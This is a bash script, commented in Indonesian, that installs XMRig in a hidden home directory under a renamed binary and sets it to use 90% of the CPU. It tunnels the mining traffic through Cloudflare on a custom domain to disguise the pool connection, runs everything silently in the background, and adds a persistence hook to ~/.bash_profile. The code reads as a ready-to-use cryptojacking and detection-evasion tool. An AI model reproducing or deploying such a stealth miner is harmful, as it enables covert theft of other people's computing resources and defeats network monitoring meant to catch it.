#!/bin/bash
set -e

# === KONFIGURASI YANG HARUS DIEDIT OLEH USER ===
WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
DOMAIN="vheler.cfd"        # Ganti dengan domain milikmu
POOL_TARGET="pool.hashvault.pro:443"
TUNNEL_NAME="xmrig-tunnel"
WORKER="stealth-$(hostname 2>/dev/null || echo $RANDOM)"

# === SETUP FOLDER ===
DIR="$HOME/.xmrig-stealth"
mkdir -p "$DIR"
cd "$DIR"

# === UNDUH CLOUDFLARED ===
if [ ! -f "cloudflared" ]; then
  echo "[*] Mengunduh cloudflared..."
  curl -LO https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
  mv cloudflared-linux-amd64 cloudflared
  chmod +x cloudflared
fi

# === CLOUDFLARE LOGIN ===
echo "[*] Login ke Cloudflare (ikuti browser)..."
./cloudflared tunnel login

# === BUAT TUNNEL ===
echo "[*] Membuat tunnel $TUNNEL_NAME..."
./cloudflared tunnel create $TUNNEL_NAME

# === GET TUNNEL ID ===
TUNNEL_ID=$(ls ~/.cloudflared/*.json | sed 's/.*\///;s/\.json//')

# === BUAT CONFIG.YML ===
mkdir -p ~/.cloudflared
cat > ~/.cloudflared/config.yml <<EOF
tunnel: $TUNNEL_ID
credentials-file: $HOME/.cloudflared/$TUNNEL_ID.json

ingress:
  - hostname: $DOMAIN
    service: tcp://$POOL_TARGET
  - service: http_status:404
EOF

# === UNDUH XMRIG ===
echo "[*] Mengunduh XMRig..."
XMRIG_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep browser_download_url | grep linux-static-x64.tar.gz | cut -d '"' -f 4)
curl -Lso xmrig.tar.gz "$XMRIG_URL"
tar -xzf xmrig.tar.gz --strip-components=1
rm -f xmrig.tar.gz
chmod +x xmrig
mv xmrig xmrigd

# === BUAT CONFIG MINING ===
cat > config.json <<EOF
{
  "autosave": true,
  "cpu": {
    "enabled": true,
    "max-threads-hint": 90,
    "priority": 5
  },
  "pools": [{
    "url": "$DOMAIN:443",
    "user": "$WALLET.$WORKER",
    "pass": "x",
    "tls": true
  }]
}
EOF

# === JALANKAN TUNNEL + MINER ===
echo "[*] Menjalankan Cloudflare Tunnel + XMRig..."
nohup ./cloudflared tunnel run $TUNNEL_NAME >/dev/null 2>&1 &
sleep 3
nohup ./xmrigd --config=config.json >/dev/null 2>&1 &

# === AUTOSTART SAAT LOGIN ===
cat > ~/.xmrig-stealth/.autorun.sh <<EOF
#!/bin/bash
cd "$HOME/.xmrig-stealth"
nohup ./cloudflared tunnel run $TUNNEL_NAME >/dev/null 2>&1 &
sleep 3
nohup ./xmrigd --config=config.json >/dev/null 2>&1 &
EOF
chmod +x ~/.xmrig-stealth/.autorun.sh

if ! grep -q ".xmrig-stealth/.autorun.sh" ~/.bash_profile 2>/dev/null; then
  echo "bash \$HOME/.xmrig-stealth/.autorun.sh" >> ~/.bash_profile
fi

echo
echo "[✓] Setup selesai."
echo "Mining via domain $DOMAIN:443 dimulai secara stealth."
echo
echo "🔁 Otomatis berjalan saat login terminal."
